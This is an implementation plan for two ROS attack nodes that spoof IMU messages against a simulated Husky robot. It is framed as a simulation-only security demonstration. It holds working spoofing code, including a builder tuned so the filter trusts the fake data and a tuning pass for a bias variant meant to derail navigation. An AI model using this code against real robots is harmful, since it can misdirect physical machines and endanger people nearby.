# IMU Spoofing Attack Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build two standalone rospy attack nodes that spoof `sensor_msgs/Imu` on `/imu/data` against the stock dead-reckoning Husky — one a literal reproduction of the security report's §3 attack, one tuned to actually derail `move_base` navigation.

**Architecture:** Each script is a self-contained `rospy` node (pattern-matched to the existing `attack_odom.py`) run by hand in a third terminal alongside `load-park-stock-husky.sh` (world) and `send_mapless_goal.py` (robot+planner+goal). Both publish a well-formed `sensor_msgs/Imu` to `/imu/data` at high rate to out-publish the genuine 50 Hz hector IMU plugin, and both subscribe to `/odometry/filtered` to log the victim's divergence. Neither modifies the base scripts.

**Tech Stack:** Python 3, ROS Noetic (`rospy`, `sensor_msgs/Imu`, `nav_msgs/Odometry`), `tf.transformations`, `argparse`, `csv`, `threading`.

## Global Constraints

- **Project dir:** `/home/thinh/Documents/Husky_viz/` (underscore). All files land here, alongside `attack_odom.py`/`attack_compass.py`.
- **No ground truth, ever:** never read `/gazebo/model_states`, `/gazebo/get_model_state`, or any simulator internal pose. Verified telemetry only, from ROS topics a real attacker could see. (Standing project rule, `CLAUDE.md`.)
- **`/imu/data` mounting:** `imu_link` is mounted rotated ~90° (`CLAUDE.md:78`). The genuine raw stream is non-physical (e.g. `angular_velocity.x ≈ 122 rad/s`). Any effective spoof must account for this mounting, not assume base_link axes.
- **EKF fusion (verified, `husky_control/config/localization.yaml`):** `two_d_mode: true`, `imu0_differential: true`. Fuses IMU orientation (roll/pitch/yaw) and angular velocity (roll/pitch/yaw-rate). Does **NOT** fuse IMU linear acceleration. Fuses velocity (not pose) from wheel odom.
- **Genuine IMU source (verified, `husky.urdf.xacro:377-388`):** `libhector_gazebo_ros_imu.so`, `updateRate=50.0`, `bodyName=base_link`, `topicName=imu/data`. Spoofer must publish `frame_id=base_link` and at a rate well above 50 Hz.
- **House conventions (from `attack_odom.py`):** module docstring explaining *why* (incl. an honest "expected effect" section and a "not run live end-to-end here" note if applicable); `SIMULATION-ONLY` banner; `argparse` with `--rate`/`--duration`/`--csv`; `threading.Lock` around shared telemetry state; `rospy.init_node(..., anonymous=True)`; `rospy.on_shutdown`; CSV telemetry flushed every row; clean shutdown that just stops publishing (no corrective message).
- **No git:** this repo is not a git repository. "Commit" steps are **save + verify** checkpoints — no `git` commands.

---

### Task 1: `attack_imu_faithful.py` — literal report §3 reproduction

Faithful reproduction of the report's IMU Data Spoofing: impossible values (~10 rad/s angular velocity, ~50 m/s² linear acceleration), sinusoidally modulated, published to `/imu/data`. Honest finding built in: this EKF does not fuse linear acceleration and integrates orientation differentially, so the brute-force impossible values are expected to barely perturb `/odometry/filtered`.

**Files:**
- Create: `/home/thinh/Documents/Husky_viz/attack_imu_faithful.py` (executable, `#!/usr/bin/env python3`)
- Reference (read, do not modify): `attack_odom.py` (conventions), `husky_control/config/localization.yaml`

**Interfaces:**
- Consumes: nothing from other tasks. Reads ROS topic `/odometry/filtered` (`nav_msgs/Odometry`).
- Produces: publishes `/imu/data` (`sensor_msgs/Imu`). Standalone entrypoint `main()`; class `ImuFaithfulAttack` with `run()`/`shutdown()`. (Task 2 mirrors this shape but does not import it.)

- [ ] **Step 1: Write the module docstring and constants**

Create the file with the `SIMULATION-ONLY` banner and a docstring that states: (a) this is a VERBATIM reproduction of report §3; (b) the report's payload — angular velocity ~10 rad/s (~573°/s), linear acceleration ~50 m/s² (>5g), sinusoidal modulation; (c) the honest EXPECTED-EFFECT section: this EKF's `imu0_config` does not fuse linear acceleration and uses `imu0_differential: true`, so oscillating impossible values are expected to be largely self-cancelling and to barely move `/odometry/filtered` — an honest negative result this script measures rather than asserts; (d) a "not run live end-to-end here" note.

```python
#!/usr/bin/env python3
"""LITERAL reproduction of the security report's "IMU Data Spoofing" (§3).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

Verbatim reproduction of report §3: publish sensor_msgs/Imu onto /imu/data with
IMPOSSIBLE readings -- angular velocity ~10 rad/s (~573 deg/s) and linear
acceleration ~50 m/s^2 (>5g) -- SINUSOIDALLY MODULATED to create "persistent
oscillating disturbances that confound sensor fusion" (report's language), at a
rate above the genuine 50 Hz hector IMU plugin.

WHY THIS IS EXPECTED TO HAVE LITTLE EFFECT ON THIS ROBOT (honest negative result)
--------------------------------------------------------------------------------
The stock EKF (husky_control/config/localization.yaml) fuses IMU orientation and
angular velocity but NOT linear acceleration (imu0_config accel indices false),
and uses imu0_differential: true -- it integrates the CHANGE in fused orientation
between messages. So (a) the report's headline ~50 m/s^2 accel is dropped
entirely, and (b) sinusoidally OSCILLATING angular values largely cancel under
differential integration + two_d_mode. The report's literal attack is therefore
expected to barely perturb /odometry/filtered here. This script MEASURES that.
(To actually derail, spoof a COHERENT yaw-rate bias -- see attack_imu_derail.py.)

Wiring verified against the stock topology; NOT run live end-to-end here.
"""
import argparse
import csv
import math
import threading
import time

import rospy
from sensor_msgs.msg import Imu
from nav_msgs.msg import Odometry

# Report §3 exact payload, as named constants so the banner/CSV can echo them.
REPORT_ANGULAR_VEL = 10.0   # rad/s (~573 deg/s) -- report's headline
REPORT_LINEAR_ACC = 50.0    # m/s^2 (>5g)        -- report's headline
SINUSOID_HZ = 1.0           # modulation frequency for the oscillating disturbance
IMU_FRAME_ID = "base_link"  # genuine hector plugin uses bodyName=base_link
```

- [ ] **Step 2: Implement the class, message builder, and telemetry**

```python
class ImuFaithfulAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._fused_xy_yaw = None   # (x, y, yaw) from /odometry/filtered
        self._baseline = None       # (x, y, yaw) captured pre-attack
        self._stop = threading.Event()
        self._start_wall = None
        self._pub = rospy.Publisher("/imu/data", Imu, queue_size=1)
        rospy.Subscriber("/odometry/filtered", Odometry, self._on_fused,
                         queue_size=1)
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(["elapsed_time", "fused_x", "fused_y", "fused_yaw",
                            "d_from_baseline_m", "d_yaw_from_baseline_rad"])
        self._csv_file.flush()

    def _on_fused(self, msg):
        from tf.transformations import euler_from_quaternion
        q = msg.pose.pose.orientation
        yaw = euler_from_quaternion([q.x, q.y, q.z, q.w])[2]
        with self._lock:
            self._fused_xy_yaw = (msg.pose.pose.position.x,
                                  msg.pose.pose.position.y, yaw)

    def _build_spoof(self, t):
        """One fake Imu per report §3: impossible values, sinusoidally modulated.
        Structurally valid (stamp, frame, unit quaternion, non-negative-1
        covariances) so the EKF accepts rather than rejects it."""
        s = math.sin(2.0 * math.pi * SINUSOID_HZ * t)
        msg = Imu()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = IMU_FRAME_ID
        msg.orientation.w = 1.0  # valid identity quaternion
        msg.angular_velocity.x = self.args.ang_vel * s
        msg.angular_velocity.y = self.args.ang_vel * s
        msg.angular_velocity.z = self.args.ang_vel * s
        msg.linear_acceleration.x = self.args.lin_acc * s
        msg.linear_acceleration.y = self.args.lin_acc * s
        msg.linear_acceleration.z = self.args.lin_acc * s
        # Non-(-1) covariance diagonals: -1 in [0] means "unset" and the EKF
        # would ignore that component. Small positive => "trust this".
        for cov in (msg.orientation_covariance, msg.angular_velocity_covariance,
                    msg.linear_acceleration_covariance):
            cov[0] = cov[4] = cov[8] = 0.01
        return msg

    def _log_row(self):
        with self._lock:
            cur = self._fused_xy_yaw
            base = self._baseline
        elapsed = time.time() - self._start_wall
        if cur is None:
            rospy.loginfo("[t=%6.1fs] waiting for /odometry/filtered ...", elapsed)
            return
        if base is None:
            with self._lock:
                self._baseline = cur
                base = cur
        d = math.hypot(cur[0] - base[0], cur[1] - base[1])
        dyaw = cur[2] - base[2]
        rospy.loginfo("[t=%6.1fs] fused=(%.3f,%.3f,yaw=%.3f) d_base=%.3fm dyaw=%.3f",
                      elapsed, cur[0], cur[1], cur[2], d, dyaw)
        self._csv.writerow(["%.3f" % elapsed, "%.4f" % cur[0], "%.4f" % cur[1],
                            "%.4f" % cur[2], "%.4f" % d, "%.4f" % dyaw])
        self._csv_file.flush()
```

- [ ] **Step 3: Implement `run()`, `shutdown()`, `parse_args()`, `main()`**

Model `run()`/`shutdown()`/`main()` on `attack_odom.py:326-438`: capture baseline on first fused sample, publish `_build_spoof(elapsed)` at `--rate`, log a telemetry row every 1 s, honor `--duration`, `rospy.on_shutdown(attack.shutdown)`, `anonymous=True`. `parse_args()` exposes `--rate` (default **100.0**), `--duration` (default 0 = until Ctrl-C), `--csv` (default `attack_imu_faithful.csv`), `--ang-vel` (default `REPORT_ANGULAR_VEL`), `--lin-acc` (default `REPORT_LINEAR_ACC`); error if `--rate <= 0`. `rospy.init_node("attack_imu_faithful", anonymous=True)`.

- [ ] **Step 4: Static verification (no sim required)**

Run:
```bash
cd /home/thinh/Documents/Husky_viz
chmod +x attack_imu_faithful.py
python3 -m py_compile attack_imu_faithful.py && echo "COMPILE OK"
python3 -c "import ast,sys; ast.parse(open('attack_imu_faithful.py').read()); print('PARSE OK')"
python3 attack_imu_faithful.py --help
```
Expected: `COMPILE OK`, `PARSE OK`, and an argparse help listing `--rate --duration --csv --ang-vel --lin-acc`. (`--help` triggers before `init_node`, so no roscore is needed.)

- [ ] **Step 5: Message-builder unit check (no sim required)**

Run:
```bash
cd /home/thinh/Documents/Husky_viz
python3 - <<'PY'
# Verify _build_spoof produces a well-formed Imu WITHOUT a running master, by
# stubbing rospy.Time.now to a fixed stamp. Confirms covariances are set (not -1)
# and impossible magnitudes are present at the sine peak.
import types, math, sys
import rospy
from sensor_msgs.msg import Imu
rospy.Time.now = staticmethod(lambda: rospy.Time(0))
import importlib.util
spec = importlib.util.spec_from_file_location("m", "attack_imu_faithful.py")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
a = m.ImuFaithfulAttack.__new__(m.ImuFaithfulAttack)
a.args = types.SimpleNamespace(ang_vel=10.0, lin_acc=50.0)
msg = a._build_spoof(0.25)  # sin(2*pi*1*0.25)=1 -> peak
assert abs(msg.angular_velocity.z - 10.0) < 1e-6, msg.angular_velocity.z
assert abs(msg.linear_acceleration.z - 50.0) < 1e-6, msg.linear_acceleration.z
assert msg.orientation.w == 1.0
assert msg.angular_velocity_covariance[0] == 0.01
assert msg.header.frame_id == "base_link"
print("BUILD-SPOOF OK: impossible values present, covariances set, frame=base_link")
PY
```
Expected: `BUILD-SPOOF OK: ...`.

- [ ] **Step 6: Live behavioral check (REQUIRES running sim) — record result honestly**

With terminal 1 (`./load-park-stock-husky.sh`) and terminal 2 (`./send_mapless_goal.py`) running, in terminal 3:
```bash
cd /home/thinh/Documents/Husky_viz
source /opt/ros/noetic/setup.bash
python3 attack_imu_faithful.py --duration 30 --csv faithful_run.csv
```
Expected/acceptable outcomes (record which occurred in the plan/commit note):
- Node starts, logs impossible spoofed values and a 1 Hz telemetry row.
- `d_from_baseline` and `d_yaw_from_baseline` stay **small** relative to the robot's own commanded motion — i.e. the report's literal attack does **not** meaningfully derail nav. This is the PREDICTED honest negative result and is a PASS for this task (faithful reproduction + measurement), not a failure. If it *does* strongly derail, note that too — it would contradict the EKF-config analysis and is worth flagging.

- [ ] **Step 7: Save + verify checkpoint (no git)**

```bash
cd /home/thinh/Documents/Husky_viz
ls -l attack_imu_faithful.py && python3 -m py_compile attack_imu_faithful.py && echo "SAVED + COMPILES"
```
Expected: file present and executable, `SAVED + COMPILES`.

---

### Task 2: `attack_imu_derail.py` — tuned coherent-bias attack

Same topic/type, different profile: a coherent, plausible yaw-rate bias (plus slow drift) that the differential EKF integrates into a growing heading error, at a rate that dominates the genuine 50 Hz stream. Accounts for the ~90° `imu_link` mounting via an explicit, tunable injection axis. Exposes bias/drift/rate/axis as constants because exact effective magnitudes are an empirical one-run tuning step.

**Files:**
- Create: `/home/thinh/Documents/Husky_viz/attack_imu_derail.py` (executable, `#!/usr/bin/env python3`)
- Reference (read, do not modify): `attack_imu_faithful.py` (Task 1, for shape), `attack_odom.py`, `CLAUDE.md` (mounting rule)

**Interfaces:**
- Consumes: nothing at runtime from Task 1 (does NOT import it). Reads `/odometry/filtered` (`nav_msgs/Odometry`).
- Produces: publishes `/imu/data` (`sensor_msgs/Imu`). Standalone `main()`; class `ImuDerailAttack` with `run()`/`shutdown()`.

- [ ] **Step 1: Write the module docstring and constants**

Docstring must state: (a) SIMULATION-ONLY banner; (b) this is the TUNED variant, NOT the report reproduction — it exploits the one IMU channel this EKF actually integrates: yaw-rate under `imu0_differential: true`; (c) strategy: inject a COHERENT, plausible yaw-rate bias so the EKF integrates a consistent lie into a growing heading error, driving `move_base` (which tracks `/odometry/filtered`) off path; (d) the ~90° `imu_link` mounting (`CLAUDE.md:78`) means the effective fused-yaw axis is not the intuitive base_link z — so the injection axis and magnitude are EXPOSED as tunables and the exact values are an empirical one-run tuning step; (e) "not run live end-to-end here" note.

```python
#!/usr/bin/env python3
"""TUNED IMU spoof that actually derails move_base navigation.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

NOT the report reproduction (that is attack_imu_faithful.py). This variant
exploits the ONE IMU channel the stock EKF integrates into pose:
husky_control/config/localization.yaml fuses IMU angular velocity with
imu0_differential: true, so a COHERENT, sustained yaw-rate bias is integrated
into a GROWING heading error. move_base tracks /odometry/filtered, so a corrupted
fused heading makes it steer to correct a phantom error and drive off the path.

Why coherent-and-plausible, not impossible: obvious garbage oscillates and
self-cancels under differential integration; a steady plausible bias accumulates.

MOUNTING CAVEAT (CLAUDE.md:78): imu_link is mounted rotated ~90 deg, so the axis
that maps to fused world-yaw rate is NOT the intuitive base_link z. INJECT_AXIS
and the bias/drift magnitudes are therefore TUNABLE CONSTANTS; the exact values
that produce a decisive derailment are an empirical one-run tuning step.

Wiring verified against the stock topology; NOT run live end-to-end here.
"""
import argparse
import csv
import math
import threading
import time

import rospy
from sensor_msgs.msg import Imu
from nav_msgs.msg import Odometry
from tf.transformations import euler_from_quaternion, quaternion_from_euler

# Tunables. Starting points from the EKF config; expect ONE tuning pass live.
YAW_RATE_BIAS = 0.6     # rad/s coherent bias on the injected yaw-rate axis
YAW_DRIFT = 0.02        # rad/s^2 slow additional drift so the lie keeps growing
INJECT_AXIS = "z"       # which angular_velocity axis carries the bias (mounting)
IMU_FRAME_ID = "base_link"
```

- [ ] **Step 2: Implement class + coherent-bias message builder + telemetry**

Reuse the Task 1 telemetry shape (`_on_fused`, `_log_row`, baseline capture, same CSV columns). The builder differs: inject a **coherent** (non-oscillating) yaw-rate bias that grows with drift, on `INJECT_AXIS`, and publish an orientation quaternion consistent with the integrated injected yaw so the fused-orientation and angular-velocity channels agree rather than fight.

```python
    def _build_spoof(self, t):
        """Coherent yaw-rate bias (+ slow drift), integrated orientation kept
        consistent with it. Plausible magnitudes so the EKF trusts and integrates
        the lie rather than rejecting it."""
        rate = self.args.bias + self.args.drift * t   # rad/s, grows over time
        yaw = rate * t                                 # integral of the injected rate
        msg = Imu()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = IMU_FRAME_ID
        q = quaternion_from_euler(0.0, 0.0, yaw)
        msg.orientation.x, msg.orientation.y = q[0], q[1]
        msg.orientation.z, msg.orientation.w = q[2], q[3]
        ax = {"x": 0, "y": 1, "z": 2}[self.args.axis]
        av = [0.0, 0.0, 0.0]
        av[ax] = rate
        msg.angular_velocity.x, msg.angular_velocity.y, msg.angular_velocity.z = av
        for cov in (msg.orientation_covariance, msg.angular_velocity_covariance,
                    msg.linear_acceleration_covariance):
            cov[0] = cov[4] = cov[8] = 0.01
        return msg
```

- [ ] **Step 3: Implement `run()`/`shutdown()`/`parse_args()`/`main()`**

Same structure as Task 1. `parse_args()` exposes `--rate` (default **200.0**), `--duration` (default 0), `--csv` (default `attack_imu_derail.csv`), `--bias` (default `YAW_RATE_BIAS`), `--drift` (default `YAW_DRIFT`), `--axis` (default `INJECT_AXIS`, choices `["x","y","z"]`); error if `--rate <= 0`. `rospy.init_node("attack_imu_derail", anonymous=True)`, `rospy.on_shutdown`.

- [ ] **Step 4: Static verification (no sim required)**

Run:
```bash
cd /home/thinh/Documents/Husky_viz
chmod +x attack_imu_derail.py
python3 -m py_compile attack_imu_derail.py && echo "COMPILE OK"
python3 attack_imu_derail.py --help
```
Expected: `COMPILE OK` and help listing `--rate --duration --csv --bias --drift --axis`.

- [ ] **Step 5: Message-builder unit check (no sim required)**

Run:
```bash
cd /home/thinh/Documents/Husky_viz
python3 - <<'PY'
import types, math
import rospy
rospy.Time.now = staticmethod(lambda: rospy.Time(0))
import importlib.util
spec = importlib.util.spec_from_file_location("m", "attack_imu_derail.py")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
from tf.transformations import euler_from_quaternion
a = m.ImuDerailAttack.__new__(m.ImuDerailAttack)
a.args = types.SimpleNamespace(bias=0.6, drift=0.02, axis="z")
msg = a._build_spoof(2.0)  # rate=0.6+0.02*2=0.64; yaw=0.64*2=1.28
assert abs(msg.angular_velocity.z - 0.64) < 1e-6, msg.angular_velocity.z
q = msg.orientation
yaw = euler_from_quaternion([q.x, q.y, q.z, q.w])[2]
assert abs(yaw - 1.28) < 1e-6, yaw
assert msg.angular_velocity.x == 0.0 and msg.angular_velocity.y == 0.0
print("BUILD-SPOOF OK: coherent bias grows, orientation consistent, axis=z")
PY
```
Expected: `BUILD-SPOOF OK: ...`.

- [ ] **Step 6: Live behavioral check + tuning pass (REQUIRES running sim)**

With terminals 1 and 2 running, in terminal 3:
```bash
cd /home/thinh/Documents/Husky_viz
source /opt/ros/noetic/setup.bash
python3 attack_imu_derail.py --duration 40 --csv derail_run.csv
```
Expected: `d_yaw_from_baseline` grows over time and the robot visibly diverges from the straight-ahead path (watch Gazebo/RViz and `send_mapless_goal.py`'s `dist_to_goal`, which should stall or grow). **If the effect is weak**, this is the designed tuning step: retry adjusting `--bias` (e.g. 0.3–1.5), `--drift`, and `--axis` (`z` vs `x` vs `y` — the ~90° mounting may put the effective yaw axis on `x` or `y`). Record the values that produced a decisive derailment; update the constants `YAW_RATE_BIAS`/`YAW_DRIFT`/`INJECT_AXIS` to the winning values.

- [ ] **Step 7: Save + verify checkpoint (no git)**

```bash
cd /home/thinh/Documents/Husky_viz
ls -l attack_imu_derail.py && python3 -m py_compile attack_imu_derail.py && echo "SAVED + COMPILES"
```
Expected: file present and executable, `SAVED + COMPILES`.

---

## Self-Review

**Spec coverage:**
- Deliverable 1 (faithful) → Task 1. ✓ Impossible values + sinusoidal modulation + `base_link` frame + 100 Hz + honest-negative-result docstring + victim monitoring all present.
- Deliverable 2 (derail) → Task 2. ✓ Coherent yaw-rate bias + drift + 200 Hz + mounting-aware tunable axis + victim monitoring present.
- Shared observability (subscribe `/odometry/filtered`, baseline, log divergence at 1 Hz, clean Ctrl-C) → both tasks, Step 2/3. ✓
- Grounded topology facts (50 Hz hector plugin, `base_link`, EKF fuses orientation/ang-vel not accel, `imu0_differential`, ~90° mount) → Global Constraints + docstrings. ✓
- Out-of-scope items (no base-script edits, no runner, no detection side) → honored; no tasks touch base scripts. ✓

**Placeholder scan:** No TBD/TODO. The only deferred item (exact derail magnitudes) is an explicit, mechanized tuning step (Task 2 Step 6) with concrete starting values and a recording instruction — not a placeholder. All code steps show actual code.

**Type consistency:** `_build_spoof(t)`, `_on_fused(msg)`, `_log_row()`, `run()`, `shutdown()`, `parse_args()`, `main()` consistent across both tasks. CSV columns identical across tasks. Class names `ImuFaithfulAttack` / `ImuDerailAttack` used consistently. Arg names match between `parse_args` descriptions and `_build_spoof`/`run` usage (`args.ang_vel`/`args.lin_acc` in Task 1; `args.bias`/`args.drift`/`args.axis` in Task 2).

## Adaptation note (TDD → behavioral verification)

These are ROS nodes acting on a live Gazebo sim; classic write-failing-`pytest`-first does not apply. Each task therefore ends with: static checks (compile/parse/`--help`, no sim), an isolated message-builder unit check (stubs `rospy.Time.now`, no master), and a live behavioral check that REQUIRES the running sim and whose expected outcome is stated explicitly (including the faithful script's honest negative result). Where a step needs the sim, it says so.
